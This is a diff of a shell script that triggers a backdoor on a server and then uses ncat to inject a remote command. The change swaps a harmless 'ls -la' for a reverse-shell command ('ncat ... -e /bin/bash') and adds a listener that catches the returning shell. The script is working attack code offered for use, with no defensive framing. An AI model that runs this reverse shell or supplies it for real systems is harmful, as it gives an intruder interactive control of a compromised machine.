@@ -2,14 +2,17 @@
 
 DST_ADDR="127.0.0.1"
 DST_PORT="8080"
-RCE='ls -la'
-
 
 SRC_ADDR="127.0.0.1"
 SRC_PORT="3535"
+RCE_PORT="3545"
 
 NCAT="/usr/bin/ncat"
 
+# Remote Command Execution
+#
+# The remote command to run on the server!
+RCE="ncat ${SRC_ADDR} ${RCE_PORT} -e /bin/bash &"
 
 trigger(){
     sleep 1
@@ -22,17 +25,19 @@ if [ "$EUID" -ne 0 ]
   exit
 fi
 
+# Right away trigger the backdoor on the server
 trigger &
-
 
 # After the remote has been triggered
 # Send over the command to inject using netcat
 # reverse transmission.
 echo "Remote executing: ${RCE}"
-echo "nc -lp ${SRC_PORT}"
-${RCE} | nc -lp ${SRC_PORT}
+echo "${NCAT} -lp ${SRC_PORT}"
+echo ${RCE} | ${NCAT} -lp ${SRC_PORT} &
 
 
-# Listen on 3535 for reverse shell
-#${NCAT} -lvp 3535
-
+# Also begin listening for the return RCE
+#
+# Note: this is only required if you are performing
+# a reverse shell!
+${NCAT} -lvp ${RCE_PORT}
